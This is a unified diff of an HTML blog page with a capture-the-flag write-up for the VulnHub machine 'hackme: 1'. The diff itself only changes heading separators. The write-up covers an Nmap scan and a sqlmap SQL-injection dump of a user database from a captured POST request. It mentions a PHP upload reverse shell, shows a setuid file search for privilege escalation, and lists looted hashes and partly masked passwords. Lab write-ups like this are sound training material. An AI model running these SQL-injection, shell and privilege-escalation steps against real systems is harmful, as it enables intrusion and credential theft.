@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190926_vulnhub-imf.html"> « </a>📅 published on <code>27/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix1.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hackme-1,330/">hackme: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_hackme/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_hackme/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.34 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload">exploit_php_fileupload</a>, <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 12:01:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/xml/_quick_tcp_nmap.xml 192.168.92.180
 Nmap scan report for 192.168.92.180
@@ -86,7 +86,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="nested"><code>22/tcp  |  ssh   |  OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp  |  http  |  Apache httpd 2.4.34 ((Ubuntu))
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. The web application presents an online book catalog with a search box. We run <code>sqlmap</code> on this page and find the search function vulnerable to SQLi. We dump contents of <code>webapphacking</code> database and find MD5 hashed passwords within <code>users</code> table. Most of these passwords are easily cracked but we had to use an online MD5 cracker for the password hash of user <code>superadmin</code>:  </p>
 <pre class="nested"><code>cat searchform.txt
   POST /welcome.php HTTP/1.1
@@ -121,7 +121,7 @@ sqlmap -r searchform.txt -D webapphacking --dump-all --batch
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_hackme/screenshot11.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_hackme/screenshot12.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_hackme/screenshot13.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www-data@hackme&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@hackme&gt;  
@@ -142,7 +142,7 @@ www-data@hackme&gt; users
 root
 hackme
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We start with usuals and explore <code>crontab</code> and <code>sudo</code> permissions. Next is searching for <code>setuid</code> files. We find an interesting file <code>/home/legacy/touchmenot</code>:  </p>
 <pre class="nested"><code>find / -type f -perm -04000 2&gt;/dev/null
   /home/legacy/touchmenot
@@ -155,14 +155,14 @@ file /home/legacy/touchmenot
 /home/legacy/touchmenot
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_hackme/screenshot16.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>hackme:$6$.L285vCy$Hma4mKjGV.sE7ZCFVj2iOkRokX1u3F5DMiTPQFoZPJnQ1kUXLje/bY2BIUQFbYu.8M6BvLML5fAftZOCE........................
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
 <pre class="nested"><code>webapp: user1/he..., user2/comma..., user3/p@ssw..., test/testt..., superadmin/Uncrac....., test1/testt...
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a>  </li>
 <li><a href="https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/">https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/</a>  </li>
